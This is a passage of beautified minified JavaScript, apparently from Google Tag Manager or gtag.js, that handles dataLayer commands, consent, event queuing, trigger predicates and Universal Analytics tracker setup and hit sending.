          var q = $r[h] || [];
          q.length && (c = c.concat(q));
        }
      }
      return {
        ml: c,
        ol: d
      };
    },
    bs = function (a) {
      k(Zr, function (b, c) {
        var d = c.indexOf(a);
        0 <= d && c.splice(d, 1);
      });
    },
    cs = function (a) {
      k($r, function (b, c) {
        var d = c.indexOf(a);
        0 <= d && c.splice(d, 1);
      });
    };
  var ds = "HA GF G UA AW DC MC".split(" "),
    es = !1,
    fs = !1;
  function gs(a, b) {
    a.hasOwnProperty("gtm.uniqueEventId") || Object.defineProperty(a, "gtm.uniqueEventId", {
      value: Ue()
    });
    b.eventId = a["gtm.uniqueEventId"];
    b.priorityId = a["gtm.priorityId"];
    return {
      eventId: b.eventId,
      priorityId: b.priorityId
    };
  }
  var hs = void 0,
    is = void 0;
  function js(a, b, c) {
    var d = H(a);
    d.eventId = void 0;
    d.inheritParentConfig = void 0;
    Object.keys(b).some(function (f) {
      return void 0 !== b[f];
    }) && J(136);
    var e = H(b);
    H(c, e);
    pr(lr(lg()[0], e), a.eventId, d);
  }
  function ks(a) {
    for (var b = ha([K.g.Tc, K.g.Lb]), c = b.next(); !c.done; c = b.next()) {
      var d = c.value,
        e = a && a[d] || Pr.C[d];
      if (e) return e;
    }
  }
  var ls = {
      config: function (a, b) {
        var c = P(59),
          d = gs(a, b);
        if (!(2 > a.length) && g(a[1])) {
          var e = {};
          if (2 < a.length) {
            if (void 0 != a[2] && !ic(a[2]) || 3 < a.length) return;
            e = a[2];
          }
          var f = el(a[1], b.isGtmEvent);
          if (f) {
            var h, l, m;
            a: {
              if (!hg.te) {
                var n = rg(xg());
                if (Bg(n)) {
                  var p = n.parent,
                    q = p.isDestination;
                  m = {
                    ql: rg(p),
                    kl: q
                  };
                  break a;
                }
              }
              m = void 0;
            }
            var r = m;
            r && (h = r.ql, l = r.kl);
            Sq(d.eventId, "gtag.config");
            var t = f.X,
              u = f.id !== t;
            if (u ? -1 === ng().indexOf(t) : -1 === lg().indexOf(t)) {
              if (!(c && b.inheritParentConfig || P(26) && e[K.g.qb])) {
                var v = ks(e);
                if (u) Dp(t, v, {
                  source: 2,
                  fromContainerExecution: b.fromContainerExecution
                });else if (c && void 0 !== h && -1 !== h.containers.indexOf(t)) {
                  var w = e;
                  hs ? js(b, w, hs) : is || (is = H(w));
                } else Cp(t, v, !0, {
                  source: 2,
                  fromContainerExecution: b.fromContainerExecution
                });
              }
            } else {
              if (h && (J(128), l && J(130), c && b.inheritParentConfig)) {
                var x = e;
                is ? js(b, is, x) : !x[K.g.Mb] && Fe && hs || (hs = H(x));
                return;
              }
              if (Fe && !u && !e[K.g.Mb]) {
                var y = fs;
                fs = !0;
                if (y) return;
              }
              es || J(43);
              if (!b.noTargetGroup) if (u) {
                cs(f.id);
                var A = f.id,
                  B = e[K.g.ie] || "default";
                B = String(B).split(",");
                for (var C = 0; C < B.length; C++) {
                  var I = $r[B[C]] || [];
                  $r[B[C]] = I;
                  0 > I.indexOf(A) && I.push(A);
                }
              } else {
                bs(f.id);
                var E = f.id,
                  F = e[K.g.ie] || "default";
                F = F.toString().split(",");
                for (var L = 0; L < F.length; L++) {
                  var M = Zr[F[L]] || [];
                  Zr[F[L]] = M;
                  0 > M.indexOf(E) && M.push(E);
                }
              }
              delete e[K.g.ie];
              var S = b.eventMetadata || {};
              S.hasOwnProperty("is_external_event") || (S.is_external_event = !b.fromContainerExecution);
              b.eventMetadata = S;
              delete e[K.g.Oc];
              for (var Z = u ? [f.id] : ng(), R = 0; R < Z.length; R++) {
                var O = e,
                  Y = H(b),
                  ba = el(Z[R], Y.isGtmEvent);
                ba && Pr.push("config", [O], ba, Y);
              }
            }
          }
        }
      },
      consent: function (a, b) {
        if (3 === a.length) {
          J(39);
          var c = gs(a, b),
            d = a[1];
          "default" === d ? Yf(a[2]) : "update" === d ? Zf(a[2], c) : "declare" === d ? b.fromContainerExecution && Xf(a[2]) : "core_platform_services" === d && $f(a[2]);
        }
      },
      event: function (a, b) {
        var c = a[1];
        if (!(2 > a.length) && g(c)) {
          var d;
          if (2 < a.length) {
            if (!ic(a[2]) && void 0 != a[2] || 3 < a.length) return;
            d = a[2];
          }
          var e = d,
            f = {},
            h = (f.event = c, f);
          e && (h.eventModel = H(e), e[K.g.Oc] && (h.eventCallback = e[K.g.Oc]), e[K.g.ce] && (h.eventTimeout = e[K.g.ce]));
          var l = gs(a, b),
            m = l.eventId,
            n = l.priorityId;
          h["gtm.uniqueEventId"] = m;
          n && (h["gtm.priorityId"] = n);
          if ("optimize.callback" === c) return h.eventModel = h.eventModel || {}, h;
          var p;
          var q = d,
            r = q && q[K.g.Kb];
          void 0 === r && (r = $e(K.g.Kb, 2), void 0 === r && (r = "default"));
          if (g(r) || va(r)) {
            var t;
            b.isGtmEvent ? t = g(r) ? [r] : r : t = r.toString().replace(/\s+/g, "").split(",");
            var u = as(t, b.isGtmEvent),
              v = u.ml,
              w = u.ol;
            if (w.length) for (var x = ks(q), y = 0; y < w.length; y++) {
              var A = el(w[y], b.isGtmEvent);
              A && Dp(A.X, x, {
                source: 3,
                fromContainerExecution: b.fromContainerExecution
              });
            }
            p = gl(v, b.isGtmEvent);
          } else p = void 0;
          var B = p;
          if (B) {
            Sq(m, c);
            for (var C = [], I = 0; I < B.length; I++) {
              var E = B[I],
                F = H(b);
              if (-1 !== ds.indexOf(sg(E.prefix))) {
                var L = H(d),
                  M = F.eventMetadata || {};
                M.hasOwnProperty("is_external_event") || (M.is_external_event = !F.fromContainerExecution);
                F.eventMetadata = M;
                delete L[K.g.Oc];
                Qr(c, L, E.id, F);
              }
              C.push(E.id);
            }
            h.eventModel = h.eventModel || {};
            0 < B.length ? h.eventModel[K.g.Kb] = C.join() : delete h.eventModel[K.g.Kb];
            es || J(43);
            void 0 === b.noGtmEvent && b.eventMetadata && b.eventMetadata.syn_or_mod && (b.noGtmEvent = !0);
            h.eventModel[K.g.pb] && (b.noGtmEvent = !0);
            return b.noGtmEvent ? void 0 : h;
          }
        }
      },
      get: function (a, b) {
        J(53);
        if (4 === a.length && g(a[1]) && g(a[2]) && ta(a[3])) {
          var c = el(a[1], b.isGtmEvent),
            d = String(a[2]),
            e = a[3];
          if (c) {
            es || J(43);
            var f = ks();
            if (!xa(ng(), function (l) {
              return c.X === l;
            })) Dp(c.X, f, {
              source: 4,
              fromContainerExecution: b.fromContainerExecution
            });else if (-1 !== ds.indexOf(sg(c.prefix))) {
              gs(a, b);
              var h = {};
              Uf(H((h[K.g.Xa] = d, h[K.g.nb] = e, h)));
              Rr(d, function (l) {
                G(function () {
                  return e(l);
                });
              }, c.id, b);
            }
          }
        }
      },
      js: function (a, b) {
        if (2 == a.length && a[1].getTime) {
          es = !0;
          var c = gs(a, b),
            d = c.eventId,
            e = c.priorityId,
            f = {};
          return f.event = "gtm.js", f["gtm.start"] = a[1].getTime(), f["gtm.uniqueEventId"] = d, f["gtm.priorityId"] = e, f;
        }
      },
      policy: function () {},
      set: function (a, b) {
        var c;
        2 == a.length && ic(a[1]) ? c = H(a[1]) : 3 == a.length && g(a[1]) && (c = {}, ic(a[2]) || va(a[2]) ? c[a[1]] = H(a[2]) : c[a[1]] = a[2]);
        if (c) {
          var d = gs(a, b),
            e = d.eventId,
            f = d.priorityId;
          H(c);
          var h = H(c);
          Pr.push("set", [h], void 0, b);
          c["gtm.uniqueEventId"] = e;
          f && (c["gtm.priorityId"] = f);
          P(14) && delete c.event;
          b.overwriteModelFields = !0;
          return c;
        }
      }
    },
    ms = {
      policy: !0
    };
  var ns = function (a) {
      var b = z[ze.da].hide;
      if (b && void 0 !== b[a] && b.end) {
        b[a] = !1;
        var c = !0,
          d;
        for (d in b) if (b.hasOwnProperty(d) && !0 === b[d]) {
          c = !1;
          break;
        }
        c && (b.end(), b.end = null);
      }
    },
    os = function (a) {
      var b = z[ze.da],
        c = b && b.hide;
      c && c.end && (c[a] = !0);
    };
  var ps = !1,
    qs = [];
  function rs() {
    if (!ps) {
      ps = !0;
      for (var a = 0; a < qs.length; a++) G(qs[a]);
    }
  }
  var ss = function (a) {
    ps ? G(a) : qs.push(a);
  };
  var Js = function (a) {
    if (Is(a)) return a;
    this.h = a;
  };
  Js.prototype.getUntrustedMessageValue = function () {
    return this.h;
  };
  var Is = function (a) {
    return !a || "object" !== fc(a) || ic(a) ? !1 : "getUntrustedMessageValue" in a;
  };
  Js.prototype.getUntrustedMessageValue = Js.prototype.getUntrustedMessageValue;
  var Ks = 0,
    Ls = {},
    Ms = [],
    Ns = [],
    Os = !1,
    Ps = !1;
  function Qs(a, b) {
    return a.messageContext.eventId - b.messageContext.eventId || a.messageContext.priorityId - b.messageContext.priorityId;
  }
  var Rs = function (a) {
      return z[ze.da].push(a);
    },
    Ss = function (a, b) {
      if (!ua(b) || 0 > b) b = 0;
      var c = Ae[ze.da],
        d = 0,
        e = !1,
        f = void 0;
      f = z.setTimeout(function () {
        e || (e = !0, a());
        f = void 0;
      }, b);
      return function () {
        var h = c ? c.subscribers : 1;
        ++d === h && (f && (z.clearTimeout(f), f = void 0), e || (a(), e = !0));
      };
    };
  function Ts(a, b) {
    var c = a._clear || b.overwriteModelFields;
    k(a, function (e, f) {
      "_clear" !== e && (c && cf(e), cf(e, f));
    });
    Pe || (Pe = a["gtm.start"]);
    var d = a["gtm.uniqueEventId"];
    if (!a.event) return !1;
    "number" !== typeof d && (d = Ue(), a["gtm.uniqueEventId"] = d, cf("gtm.uniqueEventId", d));
    return Lr(a);
  }
  function Us(a) {
    if (null == a || "object" !== typeof a) return !1;
    if (a.event) return !0;
    if (Ca(a)) {
      var b = a[0];
      if ("config" === b || "event" === b || "js" === b || "get" === b) return !0;
    }
    return !1;
  }
  function Vs() {
    var a;
    if (Ns.length) a = Ns.shift();else if (Ms.length) a = Ms.shift();else return;
    var b;
    var c = a;
    if (Os || !Us(c.message)) b = c;else {
      Os = !0;
      var d = c.message["gtm.uniqueEventId"];
      "number" !== typeof d && (d = c.message["gtm.uniqueEventId"] = Ue());
      var e = {},
        f = {
          message: (e.event = "gtm.init_consent", e["gtm.uniqueEventId"] = d - 2, e),
          messageContext: {
            eventId: d - 2
          }
        },
        h = {},
        l = {
          message: (h.event = "gtm.init", h["gtm.uniqueEventId"] = d - 1, h),
          messageContext: {
            eventId: d - 1
          }
        };
      Ms.unshift(l, c);
      if (Jg) {
        var m = jg.ctid;
        if (m) {
          var n,
            p = rg(xg());
          n = p && p.context;
          var q,
            r = uj(z.location.href);
          q = r.hostname + r.pathname;
          var t = n && n.fromContainerExecution,
            u = n && n.source,
            v = jg.Kf,
            w = hg.te;
          Jg && (Ep || (Ep = q), Fp.push(m + ";" + v + ";" + (t ? 1 : 0) + ";" + (u || 0) + ";" + (w ? 1 : 0)));
        }
      }
      b = f;
    }
    return b;
  }
  function Ws() {
    for (var a = !1, b; !Ps && (b = Vs());) {
      Ps = !0;
      delete Xe.eventModel;
      Ze();
      var c = b,
        d = c.message,
        e = c.messageContext;
      if (null == d) Ps = !1;else {
        if (e.fromContainerExecution) for (var f = ["gtm.allowlist", "gtm.blocklist", "gtm.whitelist", "gtm.blacklist", "tagTypeBlacklist"], h = 0; h < f.length; h++) {
          var l = f[h],
            m = $e(l, 1);
          if (va(m) || ic(m)) m = H(m);
          Ye[l] = m;
        }
        try {
          if (ta(d)) try {
            d.call(af);
          } catch (C) {} else if (va(d)) {
            var n = d;
            if (g(n[0])) {
              var p = n[0].split("."),
                q = p.pop(),
                r = n.slice(1),
                t = $e(p.join("."), 2);
              if (null != t) try {
                t[q].apply(t, r);
              } catch (C) {}
            }
          } else {
            var u = void 0,
              v = !1;
            if (Ca(d)) {
              a: {
                if (d.length && g(d[0])) {
                  var w = ls[d[0]];
                  if (w && (!e.fromContainerExecution || !ms[d[0]])) {
                    u = w(d, e);
                    break a;
                  }
                }
                u = void 0;
              }
              (v = u && "set" === d[0] && !!u.event) && J(101);
            } else u = d;
            if (u) {
              var x = Ts(u, e);
              a = x || a;
              v && x && J(113);
            }
          }
        } finally {
          e.fromContainerExecution && Ze(!0);
          var y = d["gtm.uniqueEventId"];
          if ("number" === typeof y) {
            for (var A = Ls[String(y)] || [], B = 0; B < A.length; B++) Ns.push(Xs(A[B]));
            A.length && Ns.sort(Qs);
            delete Ls[String(y)];
            y > Ks && (Ks = y);
          }
          Ps = !1;
        }
      }
    }
    return !a;
  }
  function Ys() {
    if (P(30)) {
      var a = Zs();
    }
    var e = Ws();
    try {
      ns(pg());
    } catch (f) {}
    return e;
  }
  function qr(a) {
    if (Ks < a.notBeforeEventId) {
      var b = String(a.notBeforeEventId);
      Ls[b] = Ls[b] || [];
      Ls[b].push(a);
    } else Ns.push(Xs(a)), Ns.sort(Qs), G(function () {
      Ps || Ws();
    });
  }
  function Xs(a) {
    return {
      message: a.message,
      messageContext: a.messageContext
    };
  }
  var $s = function () {
      function a(f) {
        var h = {};
        if (Is(f)) {
          var l = f;
          f = Is(l) ? l.getUntrustedMessageValue() : void 0;
          h.fromContainerExecution = !0;
        }
        return {
          message: f,
          messageContext: h
        };
      }
      var b = Lb(ze.da, []),
        c = Ae[ze.da] = Ae[ze.da] || {};
      !0 === c.pruned && J(83);
      Ls = or().get();
      rr();
      Vp(function () {
        if (!c.gtmDom) {
          c.gtmDom = !0;
          var f = {};
          b.push((f.event = "gtm.dom", f));
        }
      });
      ss(function () {
        if (!c.gtmLoad) {
          c.gtmLoad = !0;
          var f = {};
          b.push((f.event = "gtm.load", f));
        }
      });
      c.subscribers = (c.subscribers || 0) + 1;
      var d = b.push;
      b.push = function () {
        var f;
        if (0 < Ae.SANDBOXED_JS_SEMAPHORE) {
          f = [];
          for (var h = 0; h < arguments.length; h++) f[h] = new Js(arguments[h]);
        } else f = [].slice.call(arguments, 0);
        var l = f.map(function (q) {
          return a(q);
        });
        Ms.push.apply(Ms, l);
        var m = d.apply(b, f),
          n = Math.max(100, Number("1000") || 300);
        if (this.length > n) for (J(4), c.pruned = !0; this.length > n;) this.shift();
        var p = "boolean" !== typeof m || m;
        return Ws() && p;
      };
      var e = b.slice(0).map(function (f) {
        return a(f);
      });
      Ms.push.apply(Ms, e);
      Zs() && (P(30) && Ho(), G(Ys));
    },
    Zs = function () {
      var a = !0;
      return a;
    };
  function at(a) {
    if (null == a || 0 === a.length) return !1;
    var b = Number(a),
      c = Ja();
    return b < c + 3E5 && b > c - 9E5;
  }
  function bt(a) {
    return a && 0 === a.indexOf("pending:") ? at(a.substr(8)) : !1;
  }
  ;
  var wt = function () {};
  var Wc = {};
  Wc.se = new String("undefined");
  var Zt = z.clearTimeout,
    $t = z.setTimeout,
    U = function (a, b, c, d) {
      if (Vi()) {
        b && G(b);
      } else return Qb(a, b, c, d);
    },
    au = function () {
      return new Date();
    },
    bu = function () {
      return z.location.href;
    },
    cu = function (a) {
      return sj(uj(a), "fragment");
    },
    du = function (a) {
      return tj(uj(a));
    },
    eu = function (a, b) {
      return $e(a, b || 2);
    },
    fu = function (a, b, c) {
      var d;
      b ? (a.eventCallback = b, c && (a.eventTimeout = c), d = Rs(a)) : d = Rs(a);
      return d;
    },
    gu = function (a, b) {
      z[a] = b;
    },
    V = function (a, b, c) {
      b && (void 0 === z[a] || c && !z[a]) && (z[a] = b);
      return z[a];
    },
    hu = function (a, b, c) {
      return Ci(a, b, void 0 === c ? !0 : !!c);
    },
    iu = function (a, b, c) {
      return 0 === Li(a, b, c);
    },
    ju = function (a, b) {
      if (Vi()) {
        b && G(b);
      } else Sb(a, b);
    },
    ku = function (a) {
      return !!Ft(a, "init", !1);
    },
    lu = function (a) {
      Dt(a, "init", !0);
    },
    mu = function (a, b, c) {
      jc(a) || Zq(c, b, a);
    };
  function Ku(a, b) {
    function c(h) {
      var l = uj(h),
        m = sj(l, "protocol"),
        n = sj(l, "host", !0),
        p = sj(l, "port"),
        q = sj(l, "path").toLowerCase().replace(/\/$/, "");
      if (void 0 === m || "http" === m && "80" === p || "https" === m && "443" === p) m = "web", p = "default";
      return [m, n, p, q];
    }
    for (var d = c(String(a)), e = c(String(b)), f = 0; f < d.length; f++) if (d[f] !== e[f]) return !1;
    return !0;
  }
  function Lu(a) {
    return Mu(a) ? 1 : 0;
  }
  function Mu(a) {
    var b = a.arg0,
      c = a.arg1;
    if (a.any_of && Array.isArray(c)) {
      for (var d = 0; d < c.length; d++) {
        var e = H(a, {});
        H({
          arg1: c[d],
          any_of: void 0
        }, e);
        if (Lu(e)) return !0;
      }
      return !1;
    }
    switch (a["function"]) {
      case "_cn":
        return 0 <= String(b).indexOf(String(c));
      case "_css":
        var f;
        a: {
          if (b) try {
            for (var h = 0; h < xd.length; h++) {
              var l = xd[h];
              if (b[l]) {
                f = b[l](c);
                break a;
              }
            }
          } catch (v) {}
          f = !1;
        }
        return f;
      case "_ew":
        var m, n;
        m = String(b);
        n = String(c);
        var p = m.length - n.length;
        return 0 <= p && m.indexOf(n, p) === p;
      case "_eq":
        return String(b) === String(c);
      case "_ge":
        return Number(b) >= Number(c);
      case "_gt":
        return Number(b) > Number(c);
      case "_lc":
        return 0 <= String(b).split(",").indexOf(String(c));
      case "_le":
        return Number(b) <= Number(c);
      case "_lt":
        return Number(b) < Number(c);
      case "_re":
        var q;
        var r = a.ignore_case ? "i" : void 0;
        try {
          var t = String(c) + r,
            u = yd.get(t);
          u || (u = new RegExp(c, r), yd.set(t, u));
          q = u.test(b);
        } catch (v) {
          q = !1;
        }
        return q;
      case "_sw":
        return 0 === String(b).indexOf(String(c));
      case "_um":
        return Ku(b, c);
    }
    return !1;
  }
  ;
  function Nu() {
    var a = ["&cv=1", "&rv=" + ze.Gf, "&tc=" + Rc.filter(function (b) {
      return b;
    }).length];
    ze.md && a.push("&x=" + ze.md);
    return a.join("");
  }
  ;
  var qv = function () {
      var a = !0;
      hi(7) && hi(9) && hi(10) || (a = !1);
      return a;
    },
    rv = function () {
      var a = !0;
      hi(3) && hi(4) || (a = !1);
      return a;
    };
  var vv = function (a, b) {
      if (!b.isGtmEvent) {
        var c = T(b, K.g.Xa),
          d = T(b, K.g.nb),
          e = T(b, c);
        if (void 0 === e) {
          var f = void 0;
          sv.hasOwnProperty(c) ? f = sv[c] : tv.hasOwnProperty(c) && (f = tv[c]);
          1 === f && (f = uv(c));
          g(f) ? gq()(function () {
            var h = gq().getByName(a).get(f);
            d(h);
          }) : d(void 0);
        } else d(e);
      }
    },
    wv = function (a, b) {
      var c = a[K.g.Ib],
        d = b + ".",
        e = a[K.g.O] || "",
        f = void 0 === c ? !!a.use_anchor : "fragment" === c,
        h = !!a[K.g.rb];
      e = String(e).replace(/\s+/g, "").split(",");
      var l = gq();
      l(d + "require", "linker");
      l(d + "linker:autoLink", e, f, h);
    },
    Av = function (a, b, c) {
      if (Of() && (!c.isGtmEvent || !xv[a])) {
        var d = !Q(K.g.N),
          e = function (f) {
            var h,
              l,
              m = gq(),
              n = yv(b, "", c),
              p,
              q = n.createOnlyFields._useUp;
            if (c.isGtmEvent || zv(b, n.createOnlyFields)) {
              c.isGtmEvent && (h = "gtm" + Ue(), l = n.createOnlyFields, n.gtmTrackerName && (l.name = h));
              m(function () {
                var t = m.getByName(b);
                t && (p = t.get("clientId"));
                c.isGtmEvent || m.remove(b);
              });
              m("create", a, c.isGtmEvent ? l : n.createOnlyFields);
              d && Q(K.g.N) && (d = !1, m(function () {
                var t = gq().getByName(c.isGtmEvent ? h : b);
                !t || t.get("clientId") == p && q || (c.isGtmEvent ? (n.fieldsToSet["&gcu"] = "1", n.fieldsToSet["&sst.gcut"] = ue[f]) : (n.fieldsToSend["&gcu"] = "1", n.fieldsToSend["&sst.gcut"] = ue[f]), t.set(n.fieldsToSet), c.isGtmEvent ? t.send("pageview") : t.send("pageview", n.fieldsToSend));
              }));
              c.isGtmEvent && m(function () {
                m.remove(h);
              });
            }
          };
        ag(function () {
          return e(K.g.N);
        }, K.g.N);
        ag(function () {
          return e(K.g.F);
        }, K.g.F);
        c.isGtmEvent && (xv[a] = !0);
      }
    },
    Bv = function (a, b) {
      zp() && b && (a[K.g.Hb] = b);
    },
    Kv = function (a, b, c) {
      function d() {
        var F = T(c, K.g.Jc);
        l(function () {
          if (!c.isGtmEvent && ic(F)) {
            var L = u.fieldsToSend,
              M = m().getByName(n),
              S;
            for (S in F) if (F.hasOwnProperty(S) && /^(dimension|metric)\d+$/.test(S) && void 0 != F[S]) {
              var Z = M.get(uv(F[S]));
              Cv(L, S, Z);
            }
          }
        });
      }
      function e() {
        if (u.displayfeatures) {
          var F = "_dc_gtm_" + f.replace(/[^A-Za-z0-9-]/g, "");
          p("require", "displayfeatures", void 0, {
            cookieName: F
          });
        }
      }
      var f = a,
        h = "https://www.google-analytics.com/analytics.js",
        l = c.isGtmEvent ? iq(T(c, "gaFunctionName")) : iq();
      if (ta(l)) {
        var m = gq,
          n;
        c.isGtmEvent ? n = T(c, "name") || T(c, "gtmTrackerName") : n = "gtag_" + f.split("-").join("_");
        var p = function (F) {
            var L = [].slice.call(arguments, 0);
            L[0] = n ? n + "." + L[0] : "" + L[0];
            l.apply(window, L);
          },
          q = function (F) {
            var L = function (Y, ba) {
                for (var aa = 0; ba && aa < ba.length; aa++) p(Y, ba[aa]);
              },
              M = c.isGtmEvent,
              S = M ? Dv(u) : Ev(b, c);
            if (S) {
              var Z = {};
              Bv(Z, F);
              p("require", "ec", "ec.js", Z);
              M && S.Mf && p("set", "&cu", S.Mf);
              var R = S.action;
              if (M || "impressions" === R) if (L("ec:addImpression", S.di), !M) return;
              if ("promo_click" === R || "promo_view" === R || M && S.Kd) {
                var O = S.Kd;
                L("ec:addPromo", O);
                if (O && 0 < O.length && "promo_click" === R) {
                  M ? p("ec:setAction", R, S.Qa) : p("ec:setAction", R);
                  return;
                }
                if (!M) return;
              }
              "promo_view" !== R && "impressions" !== R && (L("ec:addProduct", S.Rb), p("ec:setAction", R, S.Qa));
            }
          },
          r = function (F) {
            if (F) {
              var L = {};
              if (ic(F)) for (var M in Fv) Fv.hasOwnProperty(M) && Gv(Fv[M], M, F[M], L);
              Bv(L, x);
              p("require", "linkid", L);
            }
          },
          t = function () {
            if (Vi()) {} else {
              var F = T(c, K.g.yj);
              F && (p("require", F, {
                dataLayer: ze.da
              }), p("require", "render"));
            }
          },
          u = yv(n, b, c),
          v = function (F, L, M) {
            M && (L = "" + L);
            u.fieldsToSend[F] = L;
          };
        !c.isGtmEvent && zv(n, u.createOnlyFields) && (l(function () {
          m() && m().remove(n);
        }), Hv[n] = !1);
        l("create", f, u.createOnlyFields);
        if (u.createOnlyFields[K.g.Hb] && !c.isGtmEvent) {
          var w = Ie || Ke ? yp(u.createOnlyFields[K.g.Hb], "/analytics.js") : void 0;
          w && (h = w);
        }
        var x = c.isGtmEvent ? u.fieldsToSet[K.g.Hb] : u.createOnlyFields[K.g.Hb];
        if (x) {
          var y = c.isGtmEvent ? u.fieldsToSet[K.g.ee] : u.createOnlyFields[K.g.ee];
          y && !Hv[n] && (Hv[n] = !0, l(Lq(n, y)));
        }
        c.isGtmEvent ? u.enableRecaptcha && p("require", "recaptcha", "recaptcha.js") : (d(), r(u.linkAttribution));
        var A = u[K.g.za];
        A && A[K.g.O] && wv(A, n);
        p("set", u.fieldsToSet);
        if (c.isGtmEvent) {
          if (u.enableLinkId) {
            var B = {};
            Bv(B, x);
            p("require", "linkid", "linkid.js", B);
          }
          Of() && Av(f, n, c);
        }
        if (b === K.g.ac) {
          if (c.isGtmEvent) {
            e();
            if (u.remarketingLists) {
              var C = "_dc_gtm_" + f.replace(/[^A-Za-z0-9-]/g, "");
              p("require", "adfeatures", {
                cookieName: C
              });
            }
            q(x);
            p("send", "pageview");
            u.createOnlyFields._useUp && jq(n + ".");
          } else t(), p("send", "pageview", u.fieldsToSend);
        } else b === K.g.la ? (t(), sl(f, c), T(c, K.g.vb) && (Uk(["aw", "dc"]), jq(n + ".")), 0 != u.sendPageView && p("send", "pageview", u.fieldsToSend), Av(f, n, c)) : b === K.g.Ha ? vv(n, c) : "screen_view" === b ? p("send", "screenview", u.fieldsToSend) : "timing_complete" === b ? (u.fieldsToSend.hitType = "timing", v("timingCategory", u.eventCategory, !0), c.isGtmEvent ? v("timingVar", u.timingVar, !0) : v("timingVar", u.name, !0), v("timingValue", Da(u.value)), void 0 !== u.eventLabel && v("timingLabel", u.eventLabel, !0), p("send", u.fieldsToSend)) : "exception" === b ? p("send", "exception", u.fieldsToSend) : "" === b && c.isGtmEvent || ("track_social" === b && c.isGtmEvent ? (u.fieldsToSend.hitType = "social", v("socialNetwork", u.socialNetwork, !0), v("socialAction", u.socialAction, !0), v("socialTarget", u.socialTarget, !0)) : ((c.isGtmEvent || Iv[b]) && q(x), c.isGtmEvent && e(), u.fieldsToSend.hitType = "event", v("eventCategory", u.eventCategory, !0), v("eventAction", u.eventAction || b, !0), void 0 !== u.eventLabel && v("eventLabel", u.eventLabel, !0), void 0 !== u.value && v("eventValue", Da(u.value))), p("send", u.fieldsToSend));
        if (!Jv && !c.isGtmEvent) {
          Jv = !0;
          var I = function () {
              c.onFailure();
            },
            E = function () {
              m().loaded || I();
            };
          Vi() ? G(E) : Qb(h, E, I);
        }
      } else G(c.onFailure);
    },
    Lv = function (a, b, c, d) {
      bg(function () {
        Kv(a, b, d);
      }, [K.g.N, K.g.F]);
    },
    Nv = function (a) {
      function b(e) {
        function f(l, m) {
          for (var n = 0; n < m.length; n++) {
            var p = m[n];
            if (e[p]) {
              h[l] = e[p];
              break;
            }
          }
        }
        var h = H(e);
        f("id", ["id", "item_id", "promotion_id"]);
        f("name", ["name", "item_name", "promotion_name"]);
        f("brand", ["brand", "item_brand"]);
        f("variant", ["variant", "item_variant"]);
        f("list", ["list_name", "item_list_name"]);
        f("position", ["list_position", "creative_slot", "index"]);
        (function () {
          if (e.category) h.category = e.category;else {
            for (var l = "", m = 0; m < Mv.length; m++) void 0 !== e[Mv[m]] && (l && (l += "/"), l += e[Mv[m]]);
            l && (h.category = l);
          }
        })();
        f("listPosition", ["list_position"]);
        f("creative", ["creative_name"]);
        f("list", ["list_name"]);
        f("position", ["list_position", "creative_slot"]);
        return h;
      }
      for (var c = [], d = 0; a && d < a.length; d++) a[d] && ic(a[d]) && c.push(b(a[d]));
      return c.length ? c : void 0;
    },
    Ov = function (a) {
      return Q(a);
    },
    Pv = !1;
  var Jv,
    Hv = {},
    xv = {},
    Qv = {},
    Rv = Object.freeze((Qv.page_hostname = 1, Qv[K.g.Z] = 1, Qv[K.g.jb] = 1, Qv[K.g.Oa] = 1, Qv[K.g.Ca] = 1, Qv[K.g.Pa] = 1, Qv[K.g.fc] = 1, Qv[K.g.Ic] = 1, Qv[K.g.Ja] = 1, Qv[K.g.kb] = 1, Qv[K.g.oa] = 1, Qv[K.g.Qc] = 1, Qv[K.g.Aa] = 1, Qv[K.g.sb] = 1, Qv)),
    Sv = {},
    sv = Object.freeze((Sv.client_storage = "storage", Sv.sample_rate = 1, Sv.site_speed_sample_rate = 1, Sv.store_gac = 1, Sv.use_amp_client_id = 1, Sv[K.g.Va] = 1, Sv[K.g.ya] = "storeGac", Sv[K.g.Oa] = 1, Sv[K.g.Ca] = 1, Sv[K.g.Pa] = 1, Sv[K.g.fc] = 1, Sv[K.g.Ic] = 1, Sv[K.g.kb] = 1, Sv)),
    Tv = {},
    Uv = Object.freeze((Tv._cs = 1, Tv._useUp = 1, Tv.allowAnchor = 1, Tv.allowLinker = 1, Tv.alwaysSendReferrer = 1, Tv.clientId = 1, Tv.cookieDomain = 1, Tv.cookieExpires = 1, Tv.cookieFlags = 1, Tv.cookieName = 1, Tv.cookiePath = 1, Tv.cookieUpdate = 1, Tv.legacyCookieDomain = 1, Tv.legacyHistoryImport = 1, Tv.name = 1, Tv.sampleRate = 1, Tv.siteSpeedSampleRate = 1, Tv.storage = 1, Tv.storeGac = 1, Tv.useAmpClientId = 1, Tv._cd2l = 1, Tv)),
    Vv = Object.freeze({
      anonymize_ip: 1
    }),
    Wv = {},
    tv = Object.freeze((Wv.campaign = {
      content: "campaignContent",
      id: "campaignId",
      medium: "campaignMedium",
      name: "campaignName",
      source: "campaignSource",
      term: "campaignKeyword"
    }, Wv.app_id = 1, Wv.app_installer_id = 1, Wv.app_name = 1, Wv.app_version = 1, Wv.description = "exDescription", Wv.fatal = "exFatal", Wv.language = 1, Wv.page_hostname = "hostname", Wv.transport_type = "transport", Wv[K.g.na] = "currencyCode", Wv[K.g.gh] = 1, Wv[K.g.oa] = "location", Wv[K.g.Qc] = "page", Wv[K.g.Aa] = "referrer", Wv[K.g.sb] = "title", Wv[K.g.vf] = 1, Wv[K.g.wa] = 1, Wv)),
    Xv = {},
    Yv = Object.freeze((Xv.content_id = 1, Xv.event_action = 1, Xv.event_category = 1, Xv.event_label = 1, Xv.link_attribution = 1, Xv.name = 1, Xv[K.g.za] = 1, Xv[K.g.fh] = 1, Xv[K.g.Ka] = 1, Xv[K.g.aa] = 1, Xv)),
    Zv = Object.freeze({
      displayfeatures: 1,
      enableLinkId: 1,
      enableRecaptcha: 1,
      eventAction: 1,
      eventCategory: 1,
      eventLabel: 1,
      gaFunctionName: 1,
      gtmEcommerceData: 1,
      gtmTrackerName: 1,
      linker: 1,
      remarketingLists: 1,
      socialAction: 1,
      socialNetwork: 1,
      socialTarget: 1,
      timingVar: 1,
      value: 1
    }),
    Mv = Object.freeze(["item_category", "item_category2", "item_category3", "item_category4", "item_category5"]),
    $v = {},
    Fv = Object.freeze(($v.levels = 1, $v[K.g.Ca] = "duration", $v[K.g.fc] = 1, $v)),
    aw = {},
